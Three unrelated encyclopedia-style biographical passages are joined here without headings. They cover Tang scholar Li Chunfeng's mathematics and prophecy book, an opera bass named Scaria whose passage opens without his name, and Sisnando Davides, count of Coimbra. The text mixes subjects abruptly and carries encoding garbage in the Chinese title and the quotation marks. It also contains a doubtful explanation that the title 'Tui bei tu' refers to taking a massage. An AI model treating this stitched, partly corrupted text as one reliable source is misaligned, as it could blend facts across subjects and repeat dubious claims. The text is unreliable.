Mathematics Li added corrections to certain mathematical works. Examples of this are in Nine Chapters on the Mathematical Art by Liu Hui. He demonstrated that the least common multiple of the numbers two, three, four, five, six, seven, eight, nine, ten, eleven, and twelve was 27720, the answer was flawed in the original text. Yet another instance of this was in Zu Geng's work about the area of a sphere.Ho, Peng Yoke, LI, QI and SHU. Hong Kong University Press, 1985. University of Washington Press edition 1987. ISBN 0-295- 96362-X Li gave 22/7 (3.1428571428571428571428571428571) instead of three as a better approximation of what we know now as pi. He began each annotation with the words ‚ÄúYour servant, Chunfeng, and his collaborators comment respectfully on‚Ä¶‚Äù Li did write some mathematical works of his own, little is known about them. They are usually dismissed as unimportant in comparison to his other accomplishments. With Liang Shu and Wang Zhenru, he wrote Shibu Suanjing () in 656. These were ten mathematical manuals submitted to the emperor. Literary works Li contributed to the Book of Sui and Book of Jin, which cover the history of the Sui and Jin dynasties. He wrote about the discoveries in astrology, metrology, and music. These are the official histories of the periods. The book Massage- Chart Prophecies (Tui bei tu) is generally credited to Li. The book is a collaboration of attempts to predict the future using numerology. Therefore, Li is often thought of as being a prophet. The book gets it title from a poem near the end, discussing how much time it would take to tell the story of thousands of years, it would be better to take a break and enjoy a massage. Circa 640, Li wrote the Ganying jing ÊÑüÊáâÁ∂ì to elaborate the concept of ganying cosmic correspondence. Li wrote a book discussing the importance of astrology in Chinese culture called Yisizhan in 645. This is around when he would have been working on the Linde calendar. Yet another of is works is Commentary on and Introduction to the Gold Lock and the Flowing Pearls. In this book he describes Taoist customs that was probably part of influence from his father.

Born in Graz, he studied at the conservatory in Vienna before making his debut in Pest in 1860; he sang the role of St. Bris in Les Huguenots. He was a failure, and abandoned the stage entirely in favor of further study; he selected Manuel Garc√≠a as his new teacher. Though he returned to the stage in Dessau, he did not see success until he sang at the Crystal Palace in London in 1862. In 1863 he appeared with the Leipzig Opera; in 1864 he was working in Dresden. He was engaged by the Vienna State Opera in 1872. In 1882 he created the role of Gurnemanz in Parsifal for Richard Wagner at Bayreuth. Scaria died in Blasewitz, in Germany, in 1886.

Sisnando (or Sesnando) Davides (also Dav√≠dez, Dav√≠diz, or Davidiz, and sometimes just David; died 25 August 1091) was a Mozarab nobleman and military leader of the Reconquista, born in Tent√∫gal, near Coimbra. He was a contemporary and acquaintance of El Cid, but his sphere of activity was in Iberia's southwest. Much information can be gleaned about Sisnando's life from the detailed narratives that begin the diplomas issued by his Abbadid-influenced Mozarabic chancery at Coimbra, though the authenticity of these has lately come to be doubted. Service with Seville and Le√≥n He was educated in C√≥rdoba by Muslims. He was captured during a raid by Abbad II al-Mu'tadid of Seville and taken into the service of the latter. To the Arabs he was known as Shishnando. He served al-Mu'tadid as an administrator and ambassador, but he left Seville and entered the service of Ferdinand I of Le√≥n in an identical capacity. In the following years the towns of Galicia from Guimar√£es down to Coimbra were captured from the Moors, the latter on Sisnando's advice in 1064 or 1069, with Sisnando leading the siege and being granted the countship of the region south of the Douro from Lamego to the sea after his success. He took the title aluazir (vizier) de Coimbra. Sisnando continued in the service of Ferdinand's successor, Alfonso VI. In March 1075 Sisnando was at Oviedo with the king--his first appearance at court--and El Cid for the opening of the Arca Santa. Later that same month he was one of many judges in a case between the bishop of Oviedo and count Vela Ov√©quiz concerning the property of the monastery of San Salvador de Tol, though only he and El Cid signed the decision. Later in the year Sisnando was the principal leader of Alfonso's expedition against Seville and Granada. He took part in the expedition against Granada in 1080 as well. Sisnando thrice (1076, 1080, and 1088) acted as an envoy from Alfonso to the taifa of Zaragoza, and on another occasion to Abdallah ibn Buluggin, the last Zirid king of Granada. To the latter Sisnando explained that the parias (tributes) that Alfonso exacted from him were intended to weaken him as a prelude to re- conquest. Rule of Toledo Sisnando was appointed the first governor (amil) of Toledo after its fall in 1085 and he implemented the Alfonsine policy of tolerance to the Mozarabs and Mud√©jars (Muslims) of the region. His appointment was probably related to his Mozarabic roots. Sisnando counselled Alfonso to maintain good relations with al-Qadir of Toledo by acting as the taifa's governor and protector (instead of foreign overlord interfering in its internal affairs), but when this advice was ignored the way was opened for the Almoravid conquest of Toledo, which Alfonso had treated as a tributary state; following that success the Almoravids made several gains against the Castilians. According to Ram√≥n Men√©ndez Pidal, if Sisnando's far-sighted advice had been heeded, the disaster of the Almoravids and the failure of Alfonso's empire to survive his death could have been averted. Within a short time of the conquest of Toledo Sisnando fell into disfavour with Constance of Burgundy, Alfonso's second wife, and her French court, including Bernard de Sedirac, the archbishop elect of Toledo. Ibn Bassam records that Sisnando sought to convince Alfonso to spare the mosque of Toledo, though he did not. This, however, is false, as it was not King Alfonso, but Queen Constance and the new Archbishop Bernard who reconsecrated the mosque as a Christian church. Within six months of the conquest of Toledo, Sisnando was back in Coimbra, but he was in Toledo for the consecration of the new cathedral in December. As Sisnandus Conimbriensis consul (\\"consul of Coimbra\\") his signature appears seventh on the document of reconsecration. He had been replaced as governor of Toledo by Pedro Ans√∫rez (Petrus Ansuriz). Rule of Portugal The primary reason for the re-creation of a county around Coimbra, separate from the northern County of Portugal, ruled by Sisnando, who had not attachments in northern Iberia, was to weaken the independence of the Portuguese magnates and expand central royal Leonese administration into newly conquered territories. Sisnando is first recorded ruling in Coimbra only on 1 May 1070, in a document that has come under suspicion. It is possible that his appointment to the countship was not made by Ferdinand in 1064 but rather was connected with his first appearance at Alfonso VI's court in 1075. In Portugal Sisnando built or rebuilt the castles of Coimbra, Lous√£, Montemor-o-Velho, Penacova, and Penela. He also played some role in the foundation of a diocese in central Portugal, precisely at Coimbra. A judicial document of 1077, in the name of Pelagio Gunsaluizi, an enemy of Sisnando's, refers to Sisnando as domno de tota Sancta Maria et Colimbria (\\"lord of all Santa Maria and Coimbra\\"). In a document dated 25 April 1085, Sisnando made a grant to Pedro, an abbot who had recently fled to Portugal from al-Andalus. The document refers to Sisnando as magnum ducem et consulem fidelem domnum Sisenandum (\\"great duke and faithful consul, lord Sisnando\\"). Formation of the diocese of Coimbra The appearance of a second ecclesiastical center on the Mondego River at Coimbra seems to have been a result of the operation of local forces rather than Sisnando's initiative, as an interpolated document of 13 April 1086 suggests. According to a diploma of 1086, when Paternus, Mozarab Bishop of Tortosa, came to Ferdinand I at Santiago de Compostela in 1064 on a mission from Moctadir of Zaragoza, he was approached by Sisnando, who offered him the see of Coimbra. Between 1076 and 1080, while he was at Zaragoza, Sisnando is said to have finally convinced Paterno to come west and take up the see of Coimbra. But the document of 1 March 1088 on which this claim is made is not trustworthy and the notion that the king sent Sisnando to Zaragoza for just such a purpose as recruiting a bishop is false. A Paternus was bishop of Coimbra as early as 20 November 1078. He is last mentioned as bishop on 1 March 1088 and never appears as a confirmant of a royal document. Apparently part of the royal agenda for the Council of Husillos of 1088 was the enhancing of royal control over Coimbra and its environs. The sole preserved document of the council was confirmed by a Martim, bishop-elect of Coimbra. Later in the same year a private document of Coimbra cited him, although still just as bishop-elect. Pierre David identified him as prior of the cathedral chapter of Coimbra and as the prot√©g√© of Sisnando Davides, who opposed the substitution of the Mozarabic rite (also known as Visigothic or Hispanic rite) for the Roman rite. But if Sisnando had proposed him and Alfonso had accepted him it is difficult to see why he was never consecrated. This obscure dispute continued for in the following year (1089) one Julian appears as bishop and in 1091 a John. They are probably the same person. In the 1091 document the bishop was given permission to make a pilgrimage to the Holy Land. The Old Cathedral of Coimbra, distinctly Mozarabic in style, from the time of Sisnando. He is buried there. Alfonso VI seems to have lost patience with the state of diocesan affairs in Coimbra and had secured the election of a new bishop at Eastertime of 1091. The new bishop, Cresconius, was the former abbot of Saint Bartholomew of Tui and was essentially a royal choice. He was consecrated by the archbishop of Toledo with the assistance of the bishops of Tui and Ourense. The participation of these latter, as well as later events, suggests that Cresconius would have been acceptable to Raymond of Burgundy also. But the consecration and installation of the royal candidate at Coimbra may have had to wait on the death of Sisnando. Last campaign and death On 15 March 1087 Sisnando dictated a testament in procinctu on the occasion of his leaving for a campaign with Alfonso against Yusuf ibn Tashfin, the Almoravid general. Sisnando died on 25 August 1091, after more than twenty years of semi- independent rule at Coimbra. He was buried in the Old Cathedral of Coimbra and was succeeded by his son-in-law Martim Moniz de Montemor. The County of Coimbra disappeared as an autonomous fief in 1093, having been integrated into the Second County of Portugal at the moment of its restoration in 1095 under Henry of Burgundy.
